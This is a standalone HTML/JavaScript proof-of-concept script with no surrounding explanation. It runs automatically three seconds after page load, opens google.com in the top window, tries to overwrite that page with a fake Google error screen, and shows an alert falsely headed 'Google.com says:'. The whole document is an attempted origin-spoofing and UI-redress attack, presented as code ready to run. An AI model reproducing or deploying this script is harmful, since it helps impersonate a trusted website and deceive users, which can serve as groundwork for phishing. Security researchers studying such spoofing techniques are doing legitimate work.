<script>
function runPoC() {
  // Navigate to top-level context
  const w = open("https://www.google.com", "_top");

  setTimeout(() => {
    try {
      w.document.body.innerHTML = `
        <style>
          body {
            margin: 0;
            font-family: system-ui, sans-serif;
            background: #f2f2f2;
            text-align: center;
            padding-top: 22vh;
          }
        </style>

        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="120">
        <h2>An error has occurred</h2>
        <p>Please wait while the page reloads.</p>
      `;

      // Native dialog – no input, no auth
      setTimeout(() => {
        alert(
          "Google.com says:\n\nThis page needs to reload to continue."
        );

        // Redirect to legitimate page after dialog
        location.href = "https://www.google.com";
      }, 400);

    } catch (e) {
      console.log("Blocked by browser security model");
    }
  }, 300);
}

// Trigger after delay
setTimeout(runPoC, 3000);
</script>
